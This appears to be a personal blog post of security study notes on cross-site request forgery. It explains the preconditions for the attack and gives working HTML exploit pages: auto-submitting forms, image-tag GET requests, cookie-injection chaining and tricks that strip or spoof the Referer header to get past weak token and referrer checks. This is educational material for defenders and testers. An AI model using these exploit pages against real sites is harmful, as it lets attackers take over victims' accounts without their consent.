---
layout: blog
type: blog
title: Web Application Security - Cross-Site Request Forgery
permalink: blog/web-csrf
# All dates must be YYYY-MM-DD format!
date: 2021-11-15
labels:
  - csrf tokens
  - referrer policy
  - origin policy
---

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

# Requirements

For a CSRF attack to be possible, three key conditions must be in place:

- __A relevant action.__ There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
- __Cookie-based session handling.__ Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- __No unpredictable request parameters.__ The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

# Exploit CSRF with no defenses

Construct a web page containing the following HTML
```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```

# Delivering CSRF Exploits

The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. Typically, the attacker will place the malicious HTML onto a web site that they control, and then induce victims to visit that web site. This might be done by feeding the user a link to the web site, via an email or social media message. Or if the attack is placed into a popular web site (for example, in a user comment), they might just wait for users to visit the web site. 

Some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable web site. In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. 

# CSRF Token Vulnerabilities 

## Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. 
```html
<html>
  <body>
    <img src="https://vulnerable-website.com/email/change?email=nullcell%40user.net">
  </body>
```

## Validation of CSRF token depends on token being present

 Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack

## CSRF token is not tied to the user session

 Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack. 

Note: The tokens could be single use so drop requests

## CSRF token is tied to a non-session cookie

 In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```txt
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
	  <input type="hidden" name="csrf" value="<csrf-token>" />
    </form>
    <img src="<cookie-setting-url>" onerror="document.forms[0].submit()">
  </body>
```

Note:
When it is needed to make multiple requests on a vulnerable site from a single html form, make use of `<img>` tag so it makes the request but errors out since it doesn't recieve an image then continues with the rest of the html.

The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. 

## CSRF token is simply duplicated in a cookie

Some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state

The attacker can again perform a CSRF attack if the web site contains any cookie setting functionality.

# Referrer-based Defenses Vulnerabilities

## Validation of Referrer depends on header being present

An attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:
```html
<meta name="referrer" content="never"> 
```

## Validation of Referrer can be circumvented

 Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
 `http://vulnerable-website.com.attacker-website.com/csrf-attack`
Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
`http://attacker-website.com/csrf-attack?vulnerable-website.com`

Note: 
 Although you may be able to identify this behavior using Burp, you will often find that this approach no longer works when you go to test your proof-of-concept in a browser. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the Referer header by default.

You can override this behavior by making sure that the response containing your exploit has the Referrer-Policy: unsafe-url header set (note that Referrer is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string. 

```html
<html>
  <body>
    <meta name="referrer" content="unsafe-url">
    <form action="https://vulnerable-website.com/email/change">
      <input type="hidden" name="email" value="pwned@evil-user.net"/>
    </form>
    <script>
      history.pushState("","","/?vulnerable-website.com")
      document.forms[0].submit();
    </script>
  </body>
```

Note:
`history.pushState()` add the third argument to the `Referer` Header if `unsafe-url` policy is set
